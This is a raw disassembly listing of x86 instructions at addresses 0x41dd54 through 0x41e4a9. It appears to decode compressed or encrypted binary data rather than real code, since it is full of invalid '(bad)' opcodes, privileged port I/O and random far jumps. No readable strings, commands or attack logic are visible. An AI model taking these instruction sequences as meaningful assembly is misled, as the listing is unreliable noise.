  41dd54:	xchg   ebp,eax
  41dd55:	jmp    0xf05c:0x7974a198
  41dd5c:	mov    dl,0x5c
  41dd5e:	push   ebp
  41dd5f:	jmp    0x6a6a:0x3804fbb8
  41dd66:	enter  0x4324,0x8b
  41dd6a:	rcr    BYTE PTR [edi],1
  41dd6c:	js     0x41ddcd
  41dd6e:	jno    0x41dd46
  41dd70:	popa   
  41dd71:	cmp    BYTE PTR [ecx+ebp*8-0x41f1dc50],dl
  41dd78:	xchg   ebx,eax
  41dd79:	pop    es
  41dd7a:	cmp    BYTE PTR ds:0xb9682d8b,0x8a
  41dd81:	leave  
  41dd82:	xor    bh,BYTE PTR [edi+0x3d]
  41dd85:	test   eax,0x454d80ca
  41dd8a:	ret    
  41dd8b:	add    eax,0x488892e6
  41dd90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd91:	sbb    al,0x49
  41dd93:	inc    ecx
  41dd94:	(bad)  
  41dd95:	dec    esp
  41dd96:	idiv   esi
  41dd98:	or     BYTE PTR [esi],bl
  41dd9a:	add    eax,DWORD PTR [ecx-0x36630abc]
  41dda0:	aad    0xa0
  41dda2:	(bad)  
  41dda6:	lea    esi,[edx-0x23200206]
  41ddac:	and    edx,DWORD PTR [edi]
  41ddae:	inc    edx
  41ddaf:	(bad)  
  41ddb1:	aas    
  41ddb2:	fldenv [edx]
  41ddb4:	in     eax,dx
  41ddb5:	adc    esi,DWORD PTR [edx]
  41ddb7:	jge    0x41ddf0
  41ddb9:	xor    cl,BYTE PTR [edx]
  41ddbb:	pop    esi
  41ddbc:	xchg   ecx,eax
  41ddbd:	jb     0x41dde3
  41ddbf:	div    BYTE PTR [edx+edx*8+0x75]
  41ddc3:	scas   al,BYTE PTR es:[edi]
  41ddc4:	push   0x32
  41ddc6:	xor    ebx,DWORD PTR [esp+eax*4]
  41ddc9:	sub    eax,0x700e1f47
  41ddce:	pushf  
  41ddcf:	add    edi,DWORD PTR [esi-0x10]
  41ddd2:	pop    esi
  41ddd3:	mov    DWORD PTR [ebp-0x1c616ab5],edx
  41ddd9:	cmp    esi,DWORD PTR [edi-0x72df3fdc]
  41dddf:	sahf   
  41dde0:	push   0x4f935aff
  41dde5:	shl    BYTE PTR [eax+0xf04f8a4],0x68
  41ddec:	xchg   bl,bl
  41ddee:	xchg   edi,eax
  41ddef:	adc    DWORD PTR [ebx-0x6d],esp
  41ddf2:	ror    BYTE PTR cs:[ebx],0x4
  41ddf6:	or     DWORD PTR [edx],ecx
  41ddf8:	pop    ebp
  41ddf9:	push   cs
  41ddfa:	imul   edi,DWORD PTR [esi-0x3bd58ac],0x9c414373
  41de04:	jno    0x41ddab
  41de06:	xor    al,BYTE PTR [edi-0x2bf95d5e]
  41de0c:	neg    DWORD PTR [eax+0x3e]
  41de0f:	jge    0x41de8b
  41de11:	shr    DWORD PTR [edx+0x6c],cl
  41de14:	shl    BYTE PTR [esi+0x70],cl
  41de17:	mov    esp,0xfd2fe49b
  41de1c:	int    0x62
  41de1e:	rol    DWORD PTR [edx],cl
  41de20:	or     bl,BYTE PTR [ebp+eiz*1-0xd61234d]
  41de27:	add    esi,0x66d77b0
  41de2d:	jge    0x41ddbd
  41de2f:	lahf   
  41de30:	retf   0x2f7e
  41de33:	sub    al,0x7a
  41de35:	mov    dh,0xda
  41de37:	jno    0x41de60
  41de39:	push   cs
  41de3a:	cld    
  41de3b:	adc    bh,dl
  41de3d:	stc    
  41de3e:	scas   al,BYTE PTR es:[edi]
  41de3f:	test   al,0x33
  41de41:	loopne 0x41ddc3
  41de43:	je     0x41ddf7
  41de45:	cmc    
  41de46:	outs   dx,DWORD PTR ds:[esi]
  41de47:	sbb    ebx,DWORD PTR [esi]
  41de49:	hlt    
  41de4a:	or     cl,BYTE PTR [edi+0xc]
  41de4d:	mov    es,WORD PTR [edx+ecx*1]
  41de50:	jg     0x41de4c
  41de52:	(bad)  
  41de53:	in     al,dx
  41de54:	ins    BYTE PTR es:[edi],dx
  41de55:	or     al,0x7e
  41de57:	add    DWORD PTR [eax],edi
  41de59:	sbb    BYTE PTR [edx-0x20997266],ah
  41de5f:	sub    al,0x11
  41de61:	sti    
  41de62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de63:	(bad)  
  41de64:	or     dl,dl
  41de66:	and    BYTE PTR [esi+0x63c9747],ah
  41de6c:	and    BYTE PTR [ebp-0x4da86f7c],dh
  41de72:	pop    esi
  41de73:	sti    
  41de74:	aam    0x52
  41de76:	loope  0x41de27
  41de78:	mov    al,0xf9
  41de7a:	add    ebx,ecx
  41de7c:	(bad)  
  41de7d:	call   0xe5ec:0xb20fca41
  41de84:	or     DWORD PTR [edi+0x32],ecx
  41de87:	out    dx,al
  41de88:	fistp  DWORD PTR [esi+0x19]
  41de8b:	xor    eax,0xc4043b5d
  41de90:	ret    
  41de91:	pop    edx
  41de92:	imul   ebp,DWORD PTR [esp+eax*1],0xffffff8d
  41de96:	inc    ebx
  41de97:	sub    eax,0xd02e14f5
  41de9c:	retf   
  41de9d:	mov    esi,0x4b2bc6e5
  41dea2:	addr16 test ebx,ecx
  41dea5:	push   ds
  41dea6:	jmp    DWORD PTR [edi-0x10]
  41dea9:	(bad)  
  41deaa:	scas   eax,DWORD PTR es:[edi]
  41deab:	or     al,0x79
  41dead:	mov    cs,WORD PTR [esi]
  41deaf:	push   cs
  41deb0:	adc    DWORD PTR [ebx-0x40],0x5ce3252b
  41deb7:	pop    ecx
  41deb8:	aam    0xe7
  41deba:	dec    edi
  41debb:	mov    edi,0x1a2726f5
  41dec0:	mul    BYTE PTR [esi+0x14]
  41dec3:	scas   eax,DWORD PTR es:[edi]
  41dec4:	sub    al,0xa4
  41dec6:	loopne 0x41df1d
  41dec8:	pop    edx
  41dec9:	jno    0x41deb2
  41decb:	lods   eax,DWORD PTR ds:[esi]
  41decc:	pop    ds
  41decd:	sub    BYTE PTR [ecx+ebp*1+0x49f196ac],cl
  41ded4:	mov    edx,0xb785f409
  41ded9:	fidiv  WORD PTR [ebp-0x37]
  41dedc:	jg     0x41de8a
  41dede:	std    
  41dedf:	push   esp
  41dee0:	and    eax,0x2ac074b5
  41dee5:	cmc    
  41dee6:	adc    al,0x95
  41dee8:	cmp    al,0xf8
  41deea:	sahf   
  41deeb:	xor    cl,cl
  41deed:	(bad)  
  41deef:	clc    
  41def0:	fldl2t 
  41def2:	stos   DWORD PTR es:[edi],eax
  41def3:	out    0x6b,eax
  41def5:	xchg   ebx,eax
  41def6:	xchg   ecx,eax
  41def7:	pop    esi
  41def8:	adc    DWORD PTR [ecx],edi
  41defa:	fwait
  41defb:	sbb    BYTE PTR [ebp-0x5c4e1382],0xc
  41df02:	sbb    eax,0xc4f0aae3
  41df07:	jmp    0x41df04
  41df09:	sbb    al,0xd7
  41df0b:	sub    ebx,DWORD PTR [esi+0x12c66132]
  41df11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df12:	sbb    al,0x7d
  41df14:	xchg   ebx,eax
  41df15:	pop    ebx
  41df16:	lds    edi,FWORD PTR [edx]
  41df18:	mov    eax,ds:0xc983ee85
  41df1d:	push   edi
  41df1f:	sar    BYTE PTR [edi+0x6c],0xc1
  41df23:	retf   0xcefe
  41df26:	call   0x7ff9:0xbba7
  41df2c:	sahf   
  41df2d:	in     al,0x83
  41df2f:	fcomp  QWORD PTR [eax-0x7705bfa2]
  41df35:	mov    bl,0x7
  41df37:	test   BYTE PTR [ebx+0x38],cl
  41df3a:	gs rol DWORD PTR es:[edx+0x411e913d],cl
  41df42:	push   0x14
  41df44:	cs pushf 
  41df46:	dec    ebp
  41df47:	scas   al,BYTE PTR es:[edi]
  41df48:	mov    ds:0x2a5cf75a,al
  41df4d:	fimul  WORD PTR [eax-0x15]
  41df50:	repz add eax,0x289a0f0b
  41df56:	and    BYTE PTR [ecx+0x61cd513e],al
  41df5c:	out    0xda,al
  41df5e:	xlat   BYTE PTR ds:[ebx]
  41df5f:	adc    eax,0x9e640d44
  41df64:	cmc    
  41df65:	push   edi
  41df66:	dec    edi
  41df67:	leave  
  41df68:	inc    edi
  41df69:	jno    0x41dfc8
  41df6b:	mov    ds:0xb8624715,al
  41df70:	lods   al,BYTE PTR ds:[esi]
  41df71:	jns    0x41dfe9
  41df73:	adc    eax,0xd9621aa1
  41df78:	mov    edi,0x9a8df1d9
  41df7d:	xor    eax,0x569e7a99
  41df82:	push   ds
  41df83:	aas    
  41df84:	push   esi
  41df85:	xchg   BYTE PTR [ebx+0x2f09cb4f],ch
  41df8b:	aad    0x45
  41df8d:	and    ebx,DWORD PTR [ecx-0x3e02f6af]
  41df93:	nop
  41df94:	fstp   QWORD PTR [edi]
  41df96:	mov    eax,ds:0x306a3ab2
  41df9b:	add    BYTE PTR [edx+0x16],0x97
  41df9f:	jb     0x41dff1
  41dfa1:	leave  
  41dfa2:	pop    esi
  41dfa3:	enter  0x703a,0x48
  41dfa7:	enter  0xb981,0x8c
  41dfab:	sub    DWORD PTR [eax+eax*1+0x6d534f14],0xffffffef
  41dfb3:	(bad)  
  41dfb4:	fimul  DWORD PTR [edx-0x79fdbe1]
  41dfba:	push   0x35
  41dfbc:	jl     0x41e000
  41dfbe:	jne    0x41e036
  41dfc0:	mov    ecx,0x866af6c
  41dfc5:	mov    esi,0x225d56a9
  41dfca:	std    
  41dfcb:	(bad)  
  41dfcc:	imul   esi,DWORD PTR ds:0xe5e04cb8,0x34
  41dfd3:	ret    0x4376
  41dfd6:	(bad)  
  41dfd7:	cmc    
  41dfd8:	jmp    0x41dfc2
  41dfda:	jle    0x41e03c
  41dfdc:	ins    DWORD PTR es:[edi],dx
  41dfdd:	scas   eax,DWORD PTR es:[edi]
  41dfde:	mov    eax,ds:0x26d1b97c
  41dfe3:	xchg   esi,eax
  41dfe4:	mov    fs,WORD PTR [ebx-0x6]
  41dfe7:	lahf   
  41dfe8:	ror    DWORD PTR [ebx+0x5f],0x6e
  41dfec:	dec    esi
  41dfed:	retf   
  41dfee:	aas    
  41dfef:	scas   eax,DWORD PTR es:[edi]
  41dff0:	add    eax,0x4be00a43
  41dff5:	xchg   esp,eax
  41dff6:	or     eax,0x68
  41dff9:	xlat   BYTE PTR ds:[ebx]
  41dffa:	dec    ebx
  41dffb:	jmp    0xf41b:0x2afbd00
  41e002:	sti    
  41e003:	jb     0x41df9f
  41e005:	ins    DWORD PTR es:[edi],dx
  41e006:	sub    WORD PTR [ebp+0x6c],0x63
  41e00b:	cmp    dl,BYTE PTR [ebx+0x7da2bafd]
  41e011:	mov    dl,0xb
  41e013:	fidiv  WORD PTR [ebp+0x666200aa]
  41e019:	lods   eax,DWORD PTR ds:[esi]
  41e01a:	xchg   edi,eax
  41e01b:	inc    esp
  41e01c:	inc    esi
  41e01d:	je     0x41e078
  41e01f:	sahf   
  41e020:	fs pusha 
  41e022:	ins    BYTE PTR es:[edi],dx
  41e023:	push   esi
  41e024:	cs nop
  41e026:	jp     0x41dfb2
  41e028:	test   BYTE PTR [esi],ch
  41e02a:	mov    edi,0xac2fdde2
  41e02f:	adc    DWORD PTR [esp+eax*2-0x1a5299b6],edx
  41e036:	call   0x5ce58a73
  41e03b:	(bad)  
  41e03c:	fdivr  QWORD PTR ds:[edx]
  41e03f:	xor    al,dh
  41e041:	pop    ebp
  41e042:	shl    ah,cl
  41e044:	push   cs
  41e045:	loopne 0x41e01d
  41e047:	inc    eax
  41e048:	mov    cl,0x26
  41e04a:	sub    ebx,DWORD PTR [esi-0x69]
  41e04d:	sub    BYTE PTR [ebx],al
  41e04f:	aam    0x5e
  41e051:	mov    bh,0x24
  41e053:	call   0xc459:0x99e3853f
  41e05a:	jp     0x41dfdc
  41e05c:	mov    ebx,0x93436f9d
  41e061:	out    dx,al
  41e062:	inc    edx
  41e063:	daa    
  41e064:	mov    ch,BYTE PTR [edx-0x1186f894]
  41e06a:	dec    esp
  41e06b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e06c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e06d:	adc    al,0xee
  41e06f:	fnsave [edx-0x2e]
  41e072:	jecxz  0x41e02a
  41e074:	adc    esi,esp
  41e076:	fisttp WORD PTR [eax]
  41e078:	cwde   
  41e079:	loope  0x41e081
  41e07b:	mov    edx,edi
  41e07d:	pop    edi
  41e07e:	popa   
  41e07f:	jg     0x41e034
  41e081:	sbb    al,0xda
  41e083:	add    al,0xdd
  41e085:	pusha  
  41e086:	fnstenv ss:[edi+esi*8-0x72c3a69]
  41e08e:	jmp    0x9b9fb8dd
  41e093:	dec    esp
  41e094:	nop
  41e095:	push   cs
  41e096:	mov    ds:0xe6595d96,al
  41e09b:	sar    BYTE PTR [eax+esi*4-0x33],cl
  41e09f:	jno    0x41e040
  41e0a1:	pushf  
  41e0a2:	pop    ds
  41e0a3:	mov    cl,0x66
  41e0a5:	xchg   esi,eax
  41e0a6:	adc    BYTE PTR [edi+eiz*2-0x39],dl
  41e0aa:	inc    ecx
  41e0ab:	in     eax,0xe8
  41e0ad:	pop    esp
  41e0ae:	lock nop
  41e0b0:	jno    0x41e0f8
  41e0b2:	in     eax,dx
  41e0b3:	inc    esp
  41e0b4:	pop    ebx
  41e0b5:	and    eax,0xc108fcd5
  41e0ba:	shl    BYTE PTR [eax],cl
  41e0bc:	hlt    
  41e0bd:	xchg   ebp,eax
  41e0be:	xchg   ebx,eax
  41e0bf:	xlat   BYTE PTR ds:[ebx]
  41e0c0:	inc    edi
  41e0c1:	xchg   ebx,eax
  41e0c2:	push   es
  41e0c3:	pop    ss
  41e0c4:	rcl    DWORD PTR [ecx-0x7fe66de0],1
  41e0ca:	xor    ecx,DWORD PTR [edx+0x1f1c1f34]
  41e0d0:	jecxz  0x41e0a9
  41e0d2:	xchg   ebp,eax
  41e0d3:	test   DWORD PTR ds:0xa0325ba8,ebp
  41e0d9:	mov    al,0xa0
  41e0db:	int    0x11
  41e0dd:	mov    dl,0x5e
  41e0df:	repnz pop ebp
  41e0e1:	pop    es
  41e0e2:	ficomp DWORD PTR [ecx-0x4c]
  41e0e5:	push   es
  41e0e6:	xor    DWORD PTR [edx-0x2d52f1f8],0xf
  41e0ed:	retf   0xe4f3
  41e0f0:	imul   edi,DWORD PTR [ecx+ebp*8],0x1f
  41e0f4:	add    esi,eax
  41e0f6:	xchg   edi,eax
  41e0f7:	outs   dx,BYTE PTR ds:[esi]
  41e0f8:	fst    QWORD PTR [edx+0x5]
  41e0fb:	add    al,0x90
  41e0fd:	fmul   QWORD PTR gs:[esi+ebp*8]
  41e101:	mul    ebx
  41e103:	cmp    eax,0x1600570f
  41e108:	xchg   ebx,eax
  41e109:	test   DWORD PTR [ebp+ebp*4-0x44],edx
  41e10d:	mov    dl,0xd0
  41e10f:	and    DWORD PTR [edi-0x62],esi
  41e112:	jle    0x41e158
  41e114:	cmp    dh,BYTE PTR [eax+0x7]
  41e117:	shl    BYTE PTR [edi],cl
  41e119:	dec    eax
  41e11a:	rcl    BYTE PTR [eax-0x6577982b],1
  41e120:	rol    BYTE PTR [esi],1
  41e122:	xchg   ecx,eax
  41e123:	add    BYTE PTR [esi-0x5aa61f29],0x89
  41e12a:	inc    esp
  41e12b:	mov    bh,0xaa
  41e12d:	push   ss
  41e12e:	jp     0x41e13f
  41e130:	xchg   esp,eax
  41e131:	inc    eax
  41e132:	int    0xff
  41e134:	jecxz  0x41e161
  41e136:	ret    0x41d9
  41e139:	xchg   BYTE PTR [esi+0x49dd23ba],cl
  41e13f:	mov    DWORD PTR [ecx-0x39ce00b8],edx
  41e145:	rcr    ebp,1
  41e147:	ins    BYTE PTR es:[edi],dx
  41e148:	and    eax,0x2c1347c
  41e14d:	add    BYTE PTR [ebx+ecx*1],bl
  41e150:	push   ebp
  41e151:	aas    
  41e152:	js     0x41e1c5
  41e154:	ss out 0xa3,eax
  41e157:	xchg   bh,ah
  41e159:	mov    al,ds:0x5884e296
  41e15e:	neg    BYTE PTR [esi-0x2f972a42]
  41e164:	push   ebp
  41e165:	pop    edi
  41e166:	stos   BYTE PTR es:[edi],al
  41e167:	imul   ecx,DWORD PTR [esi-0x5f291e1e],0x1a
  41e16e:	icebp  
  41e16f:	xchg   ebx,eax
  41e170:	mov    al,0x99
  41e172:	xchg   DWORD PTR [esi+0xd75c91b],esi
  41e178:	mov    ch,0xa3
  41e17a:	cmp    al,0xe5
  41e17c:	ror    BYTE PTR [eax+0x22],cl
  41e17f:	cmp    BYTE PTR [ebp+eax*8-0x46],dl
  41e183:	xchg   ecx,eax
  41e184:	(bad)  
  41e185:	ins    DWORD PTR es:[edi],dx
  41e186:	jne    0x41e17c
  41e188:	repz loop 0x41e134
  41e18b:	sbb    eax,DWORD PTR [edx-0x2e243f51]
  41e191:	jge    0x41e1bd
  41e193:	xor    ecx,eax
  41e195:	mov    ebx,DWORD PTR [ebx]
  41e197:	dec    edi
  41e198:	adc    ebp,ebx
  41e19a:	pop    ds
  41e19b:	stos   DWORD PTR es:[edi],eax
  41e19c:	jnp    0x41e1ce
  41e19e:	fistp  WORD PTR [ebp+edx*4-0x25]
  41e1a2:	xor    al,0x65
  41e1a4:	neg    DWORD PTR [eax+0xfbe9b19]
  41e1aa:	rcl    DWORD PTR [eax+0x61],1
  41e1ad:	adc    al,dl
  41e1af:	aam    0x1
  41e1b1:	int    0xb2
  41e1b3:	lahf   
  41e1b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1b5:	or     al,0xbb
  41e1b7:	xchg   edx,eax
  41e1b8:	inc    eax
  41e1b9:	fadd   QWORD PTR [esp+ecx*4+0x37]
  41e1bd:	jmp    0x3189:0x2d364085
  41e1c4:	loopne 0x41e1a5
  41e1c6:	mov    ebx,0x5db5b10c
  41e1cb:	inc    esp
  41e1cc:	pop    edx
  41e1cd:	mov    ax,ds:0x91a78504
  41e1d3:	ret    0x6fd7
  41e1d6:	cmpxchg BYTE PTR [ebp+0x676a9879],dh
  41e1dd:	xor    BYTE PTR [eax+ecx*2],cl
  41e1e0:	mov    esi,0x7545b611
  41e1e5:	popf   
  41e1e6:	add    BYTE PTR [ecx+edx*4+0x16],ah
  41e1ea:	and    al,bh
  41e1ec:	mov    ah,0x18
  41e1ee:	iret   
  41e1ef:	add    eax,0x96c5929
  41e1f4:	or     ch,BYTE PTR [edx+0x3]
  41e1f7:	stos   BYTE PTR es:[edi],al
  41e1f8:	xor    BYTE PTR [edx-0x3e],ch
  41e1fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1fc:	test   BYTE PTR [edx],ah
  41e1fe:	outs   dx,DWORD PTR ds:[esi]
  41e1ff:	inc    eax
  41e200:	cwde   
  41e201:	push   edx
  41e202:	cs dec ebp
  41e204:	sbb    ebp,DWORD PTR [esi+0x4171d3bf]
  41e20a:	adc    al,0xd0
  41e20c:	pop    esi
  41e20d:	rol    cl,cl
  41e20f:	mov    edi,0x5f783825
  41e214:	in     eax,0x1e
  41e216:	push   es
  41e217:	mov    WORD PTR [eax+0x4],gs
  41e21a:	xchg   edi,eax
  41e21b:	xchg   ebp,eax
  41e21c:	push   edi
  41e21d:	ins    BYTE PTR es:[edi],dx
  41e21e:	in     al,dx
  41e21f:	jbe    0x41e1ae
  41e221:	jle    0x41e252
  41e223:	mov    cl,0x16
  41e225:	jnp    0x41e29e
  41e227:	push   eax
  41e228:	and    eax,DWORD PTR [eax-0x6c]
  41e22b:	div    BYTE PTR [ecx+ebp*4+0x50]
  41e22f:	add    al,0x2
  41e231:	jne    0x41e219
  41e233:	dec    esi
  41e234:	mov    BYTE PTR [ebx+esi*1],cl
  41e237:	ret    0xede7
  41e23a:	add    esi,DWORD PTR [eax+eiz*8-0x5]
  41e23e:	retf   0xd0bf
  41e241:	or     DWORD PTR ds:0xd9814373,edi
  41e247:	mov    bl,BYTE PTR [esi-0xc]
  41e24a:	inc    ecx
  41e24b:	out    0x75,eax
  41e24d:	ins    DWORD PTR es:[edi],dx
  41e24e:	icebp  
  41e24f:	sub    bl,BYTE PTR [ebx-0x5f47a6a6]
  41e255:	jnp    0x41e1dd
  41e257:	and    eax,0x627de513
  41e25c:	nop
  41e25d:	mov    edi,0x5d16db1a
  41e262:	pop    esp
  41e263:	fwait
  41e264:	imul   esp,DWORD PTR [edi+0x32],0x9180c8f3
  41e26b:	xadd   DWORD PTR [edi+0x2538e4be],eax
  41e272:	ins    DWORD PTR es:[edi],dx
  41e273:	jp     0x41e242
  41e275:	inc    ebp
  41e276:	stos   DWORD PTR es:[edi],eax
  41e277:	xchg   BYTE PTR [eax+ebx*2],dl
  41e27a:	pop    eax
  41e27b:	mov    dh,0x8c
  41e27d:	ret    
  41e27e:	fsubr  st,st(6)
  41e280:	hlt    
  41e281:	and    ah,BYTE PTR [edi+0x28b9cb48]
  41e287:	push   ecx
  41e288:	mov    al,0xe3
  41e28a:	into   
  41e28b:	add    DWORD PTR [edx],ebp
  41e28d:	pusha  
  41e28e:	rol    BYTE PTR [ecx+0x29fc6e1e],cl
  41e294:	jle    0x41e2c4
  41e296:	pop    es
  41e297:	retf   
  41e298:	mov    ebx,0x29dfbff0
  41e29d:	add    al,0x76
  41e29f:	adc    DWORD PTR [eax],esp
  41e2a1:	das    
  41e2a2:	inc    ecx
  41e2a3:	int    0x12
  41e2a5:	pushf  
  41e2a6:	retf   
  41e2a7:	jno    0x41e2ff
  41e2a9:	pop    edx
  41e2aa:	out    dx,eax
  41e2ab:	jae    0x41e324
  41e2ad:	retf   0x57dc
  41e2b0:	mov    WORD PTR [ebp-0x13],ss
  41e2b3:	jge    0x41e2ef
  41e2b5:	stos   DWORD PTR es:[edi],eax
  41e2b6:	jne    0x41e2a6
  41e2b8:	test   al,0x29
  41e2ba:	and    BYTE PTR [edi-0x75],0x81
  41e2be:	add    DWORD PTR [ebx],esi
  41e2c0:	idiv   BYTE PTR [eax]
  41e2c2:	or     esp,DWORD PTR [ecx-0x1ec3a165]
  41e2c8:	pop    eax
  41e2c9:	aaa    
  41e2ca:	pop    eax
  41e2cb:	sbb    al,0x96
  41e2cd:	cld    
  41e2ce:	jo     0x41e2c6
  41e2d0:	popf   
  41e2d1:	mov    ebx,0xfcfdbea1
  41e2d6:	or     al,0x5c
  41e2d8:	pop    ecx
  41e2d9:	pop    ecx
  41e2da:	aas    
  41e2db:	adc    dl,BYTE PTR [esp+ecx*8]
  41e2de:	xchg   esi,eax
  41e2df:	push   edi
  41e2e0:	dec    esi
  41e2e1:	out    0x8,al
  41e2e3:	push   ds
  41e2e4:	pop    edx
  41e2e5:	adc    DWORD PTR [eax-0x5c5e7caf],ecx
  41e2eb:	mov    cl,0xe0
  41e2ed:	call   0x356e:0x9b2d8b0
  41e2f4:	xor    al,0x85
  41e2f6:	push   ss
  41e2f7:	ins    BYTE PTR es:[edi],dx
  41e2f8:	sub    DWORD PTR [edx],edi
  41e2fa:	pop    ds
  41e2fb:	jl     0x41e328
  41e2fd:	bound  esp,QWORD PTR [edi+0x1a]
  41e300:	mov    ch,0x95
  41e302:	and    DWORD PTR [eax-0x571ee82f],esi
  41e308:	xor    ecx,DWORD PTR [eax]
  41e30a:	push   es
  41e30b:	loopne 0x41e2d0
  41e30d:	into   
  41e30e:	push   0xfe88f149
  41e313:	push   ecx
  41e314:	lods   eax,DWORD PTR ds:[esi]
  41e315:	aaa    
  41e316:	jl     0x41e36f
  41e318:	push   es
  41e319:	lds    ecx,FWORD PTR [ecx]
  41e31b:	mov    esp,ebx
  41e31d:	shl    DWORD PTR [edi+0x7be27511],cl
  41e323:	jecxz  0x41e2e2
  41e325:	cmp    esp,edx
  41e327:	loope  0x41e338
  41e329:	mov    ebx,eax
  41e32b:	hlt    
  41e32c:	je     0x41e381
  41e32e:	jge    0x41e2dc
  41e330:	in     al,dx
  41e331:	inc    ebp
  41e332:	or     cl,BYTE PTR [ecx-0x76]
  41e335:	out    dx,al
  41e336:	int    0xce
  41e338:	add    al,0x8b
  41e33a:	push   0x7caa88d1
  41e33f:	fnstsw WORD PTR [eax+0x2690232]
  41e345:	leave  
  41e346:	nop
  41e347:	inc    edi
  41e348:	out    dx,al
  41e349:	pop    esi
  41e34a:	pop    ebx
  41e34b:	mov    ecx,DWORD PTR [edi]
  41e34d:	jno    0x41e34b
  41e34f:	retf   0x3492
  41e352:	xor    eax,0xa2115bc
  41e357:	jp     0x41e39e
  41e359:	push   ebp
  41e35a:	xor    al,0xe3
  41e35c:	lods   al,BYTE PTR ds:[esi]
  41e35d:	cli    
  41e35e:	in     al,0x21
  41e360:	inc    esp
  41e361:	mov    edx,0x5f0a816d
  41e366:	mov    esi,0x2823667
  41e36b:	out    dx,al
  41e36c:	adc    BYTE PTR [edi],0x40
  41e36f:	cmp    eax,0x341aa050
  41e374:	mov    dl,0x99
  41e376:	push   ds
  41e377:	bound  edi,QWORD PTR [eax+0x2e5c2f22]
  41e37d:	ins    BYTE PTR es:[edi],dx
  41e37e:	leave  
  41e37f:	sbb    eax,0x9e652356
  41e384:	out    0xf8,eax
  41e386:	les    esi,FWORD PTR [ecx+0x31]
  41e389:	sbb    al,0x9c
  41e38b:	cld    
  41e38c:	xchg   DWORD PTR [esi],edi
  41e38e:	cmp    al,0x87
  41e390:	add    eax,0x81bca75e
  41e395:	das    
  41e396:	adc    DWORD PTR [eax-0x5b],esp
  41e399:	pusha  
  41e39a:	sub    esi,0xffffffaf
  41e39d:	hlt    
  41e39e:	inc    edx
  41e39f:	leave  
  41e3a0:	outs   dx,DWORD PTR ds:[esi]
  41e3a1:	fwait
  41e3a2:	loopne 0x41e3fd
  41e3a4:	xlat   BYTE PTR ds:[ebx]
  41e3a5:	mov    WORD PTR [ebx+0x272bcb6f],gs
  41e3ab:	ret    0x33bf
  41e3ae:	ins    DWORD PTR es:[edi],dx
  41e3af:	mov    BYTE PTR [eax+0x5f],dh
  41e3b2:	adc    DWORD PTR [esi-0x2abdb14b],0xffffffd1
  41e3b9:	push   edi
  41e3ba:	mov    ecx,0xfae07e93
  41e3bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3c0:	outs   dx,DWORD PTR ds:[esi]
  41e3c1:	cld    
  41e3c2:	leave  
  41e3c3:	stos   BYTE PTR es:[edi],al
  41e3c4:	inc    eax
  41e3c5:	ret    0xd8b
  41e3c8:	pop    eax
  41e3c9:	cwde   
  41e3ca:	dec    eax
  41e3cb:	mov    esi,0xc93231f3
  41e3d0:	dec    eax
  41e3d1:	scas   eax,DWORD PTR es:[edi]
  41e3d2:	in     al,dx
  41e3d3:	mov    al,ds:0x5aea4130
  41e3d8:	mov    al,ds:0x311fd737
  41e3dd:	and    eax,0x796fe8d3
  41e3e2:	int3   
  41e3e3:	adc    al,0xe
  41e3e5:	mov    BYTE PTR [esi-0x44],ch
  41e3e8:	in     al,dx
  41e3e9:	idiv   BYTE PTR [edi]
  41e3eb:	jmp    0xa77cb652
  41e3f0:	inc    eax
  41e3f1:	retf   0x3480
  41e3f4:	(bad)  
  41e3f5:	cmp    ecx,DWORD PTR [edx]
  41e3f7:	sbb    eax,0x3d0107cb
  41e3fc:	arpl   WORD PTR [eax-0x2b],dx
  41e3ff:	jnp    0x41e399
  41e401:	push   DWORD PTR [edi]
  41e403:	imul   ecx,DWORD PTR [ecx+0x1379798b],0xffffffc9
  41e40a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e40b:	data16 mov ds,WORD PTR [edx+0x4d7cec80]
  41e412:	xor    bl,bl
  41e414:	adc    bh,bl
  41e416:	mov    ?,ebp
  41e418:	fld    DWORD PTR [esi+0x10]
  41e41b:	and    DWORD PTR [eax],edx
  41e41d:	adc    esp,ebx
  41e41f:	shr    DWORD PTR [ebx+esi*4-0x45c76987],0xf6
  41e427:	stos   DWORD PTR es:[edi],eax
  41e428:	push   0xa5af9be9
  41e42d:	pusha  
  41e42e:	push   edx
  41e42f:	js     0x41e493
  41e431:	push   ds
  41e432:	in     al,0x7e
  41e434:	retf   0xb395
  41e437:	xor    eax,0xdcf1b4fd
  41e43c:	inc    esi
  41e43d:	adc    DWORD PTR [edx-0x3a],esp
  41e440:	dec    esp
  41e441:	add    DWORD PTR [edx],esp
  41e443:	jle    0x41e419
  41e445:	rcl    DWORD PTR [ebx],cl
  41e447:	call   0xf548fa1f
  41e44c:	popa   
  41e44d:	mov    bl,0x29
  41e44f:	xlat   BYTE PTR ds:[ebx]
  41e450:	jb     0x41e3d3
  41e452:	shl    DWORD PTR [ecx-0x79ed0999],1
  41e458:	stos   DWORD PTR es:[edi],eax
  41e459:	push   esp
  41e45a:	mov    dl,0xbb
  41e45c:	cmp    edx,DWORD PTR [ecx-0x3fec1608]
  41e462:	jb     0x41e3e5
  41e464:	rcl    BYTE PTR [ebx+edi*8-0x26],0x38
  41e469:	sbb    ah,BYTE PTR [ebp+0x5f]
  41e46c:	in     al,0x1
  41e46e:	dec    eax
  41e46f:	dec    esi
  41e470:	inc    ebx
  41e471:	mov    ebp,0x68ba7deb
  41e476:	cmp    al,0x2
  41e478:	test   BYTE PTR [eax-0x4c287955],ah
  41e47e:	repz xor eax,0xf9c9853b
  41e484:	je     0x41e482
  41e486:	sub    ebx,ebp
  41e488:	and    al,0x66
  41e48a:	xrelease xchg BYTE PTR [edi+0x51],cl
  41e48e:	cwde   
  41e48f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e490:	dec    edi
  41e491:	xor    BYTE PTR [edx+0x2a1cfc47],al
  41e497:	cdq    
  41e498:	push   esp
  41e499:	and    BYTE PTR [ecx-0x1963d6fb],dl
  41e49f:	mov    al,ds:0xcf9ea1e0
  41e4a4:	add    eax,0xb396066e
  41e4a9:	jge    0x41e4b2
